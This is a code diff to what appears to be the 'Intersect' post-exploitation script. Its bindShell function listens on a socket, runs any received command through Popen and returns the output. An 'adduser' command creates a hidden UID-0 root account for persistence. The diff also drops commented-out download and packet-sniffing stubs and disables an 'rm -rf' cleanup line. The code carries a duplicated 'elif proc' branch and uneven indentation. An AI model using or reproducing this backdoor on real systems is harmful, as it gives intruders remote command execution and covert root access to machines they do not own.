@@ -505,8 +505,8 @@ def bindShell():
     server.listen(5)
     conn, addr = server.accept()
     print "[!] New Connection: %s" % addr[0]
-    conn.send("Intersect:"+str(os.getcwd())+" $ ")
-
+    conn.send("\nIntersect"+str(os.getcwd())+" $ ")
+    
     while True:
         cmd = conn.recv(socksize)
         proc = Popen(cmd,
@@ -518,28 +518,17 @@ def bindShell():
         stdout, stderr = proc.communicate()
         if cmd.startswith('cd'):
             os.chdir(cmd[3:].replace('\n',''))
-            conn.send("\nIntersect:"+str(os.getcwd())+" $ ")
-        if cmd.startswith('adduser'):
+            conn.send("\nIntersect"+str(os.getcwd())+" $ ")
+        elif cmd.startswith('adduser'):
            strip = cmd.split(" ")
            acct = strip[1]
            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
            conn.send("[!] Root account " + acct + " has been created.")   
-  # Ignore this code. This is incomplete and also needs the client-side script to properly utilize these commands.
-   # Custom client-side shell coming soon.
-        #elif cmd.startswith('download'):
-            #strip = cmd.split(" ")
-            #sendfile = strip[1]
-            #conn.sendall(sendfile)
-       # elif cmd.startswith('isniff'):
-           #strip = cmd.split(" ")
-            #iface = strip[1]
-            #cmd = 'tcpdump -Xs 1514 -vv -n -w - -i %s' % iface
-            #conn.sendall( stdout )
         elif proc:
             conn.sendall( stdout )
-            conn.send("\nIntersect:"+str(os.getcwd())+" $ ")
+            conn.send("\nIntersect"+str(os.getcwd())+" $ ")
         elif proc:
-    	        conn.sendall("[!] Error: " + stderr)
+    	    conn.sendall("[!] Error: " + stderr)
             conn.send("\nIntersect"+str(os.getcwd())+" $ ")
 
 
@@ -622,7 +611,7 @@ def main(argv):
             daemon()
         elif o in ("-h", "--help"):
             usage()
-            os.system("rm -rf %s" % Temp_Dir)
+           # os.system("rm -rf %s" % Temp_Dir)
             sys.exit()
         elif o in ("-t", "--tar"):
             MakeArchive()
